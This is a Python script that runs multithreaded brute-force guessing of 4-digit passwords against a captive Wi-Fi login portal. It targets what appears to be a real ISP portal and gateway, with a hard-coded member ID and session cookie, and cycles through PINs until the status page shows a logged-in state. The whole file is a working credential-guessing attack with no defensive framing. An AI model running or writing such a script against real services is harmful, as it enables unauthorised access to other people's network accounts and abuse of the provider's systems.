import requests
from concurrent.futures import ThreadPoolExecutor
import time

def brute_force_password(password):
    global password_found
    if password_found:
        return
    
    # Define the base URL and username
    base_url = 'http://10.201.21.1'
    username = "23TSFBA023"

    # First POST request
    otp_url = 'http://wifiunify38.spectra.co/userportal/pages/usermedia/spectra3/stanza-disable-random-mac/otp.jsp'
    otp_data = {
        'memberId': username
    }
    otp_cookies = {
        'JSESSIONID': 'A7A0859DC5ED1606979E3C1BDB502A78'
    }
    otp_response = requests.post(otp_url, data=otp_data, cookies=otp_cookies)

    # Second POST request
    login_url = 'http://wifiunify38.spectra.co/userportal/newlogin.do'
    login_data = {
        'username': 'STN-'+username,
        'password': password,
        'type': '2',
        'phone': '0',
        'jsonresponse': '1'
    }
    login_cookies = {
        'JSESSIONID': 'A7A0859DC5ED1606979E3C1BDB502A78'
    }
    login_response = requests.post(login_url, data=login_data, cookies=login_cookies)

    # Third POST request
    magic_url = 'http://10.201.21.1/login'
    magic_data = {
        'username': 'STN-'+username,
        'password': password,
        'magic': ''
    }
    magic_response = requests.post(magic_url, data=magic_data)

    # Convert the password to a 4-digit string
    password_str = f'{password:04}'
    
    # Define the data for the request
    magic_data = {
        'username': username,
        'password': password_str,
        'magic': ''
    }

    status_response = requests.get(f'{base_url}/')

    if "http://10.201.21.1/logout" in str(status_response._content):
        print(f"Login successful for username: {username}, password: {password_str}")
        password_found = True
    else:
        print("not connected, checked:", password)
        time.sleep(1)

# Specify the range of passwords
start_password = 1970
end_password = 10000

# Number of threads
num_threads = 5

# Split the range of passwords into chunks for each thread
chunk_size = (end_password - start_password) // num_threads
password_chunks = [(start_password + i, min(start_password + i + chunk_size, end_password)) for i in range(0, end_password - start_password, chunk_size)]

# Shared variable to indicate if password is found
password_found = False

# Brute force in parallel using ThreadPoolExecutor
with ThreadPoolExecutor(max_workers=num_threads) as executor:
    futures = [executor.submit(brute_force_password, password) for start, end in password_chunks for password in range(start, end)]
